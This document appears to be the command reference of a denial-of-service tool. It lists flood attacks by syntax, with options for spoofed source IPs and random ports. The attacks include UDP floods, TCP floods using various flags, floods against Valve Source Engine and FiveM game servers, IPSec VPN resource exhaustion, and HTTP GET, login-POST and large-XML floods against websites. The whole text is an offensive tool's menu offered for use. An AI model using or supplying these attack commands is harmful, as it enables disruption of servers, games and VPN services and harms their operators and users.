ATTACK VECTORS:
	
        # Min and Max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
        
	# Tip: you can use "-r" command for random dst ports and src IPs, but it can only use with these 2 args!!!
	# Example: ?tcp -fin -r 192.168.50.129 -r 100

	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customize flag.

		-syn            TCP flood with syn packet, just a normal syn flood.
		-ack		TCP flood with ack packet, just a normal ack flood.
		-psh		TCP flood with psh packet, just a normal psh flood.
		-urg		TCP flood with urg packet, just a normal urg flood.
		-rst		TCP flood with rst packet, for broke a TCP connection between client and target server.
		-fin		TCP flood with fin packet, for request close connection when target server are blocking a syn packet.

	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of TCP flags to target server.
	?vse <src> <dst>			      Flood TSource Engine Query request to the target game server that used valve source engine.
	?fms <src> <dst>			      Flood query payload to a FiveM game server.
	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
	?poling <url>			      	      Flood HTTP post login requests to the target login web page, didn't do any of ip spoofing!!!
	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of ip spoofing!!!
	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of ip spoofing!!!
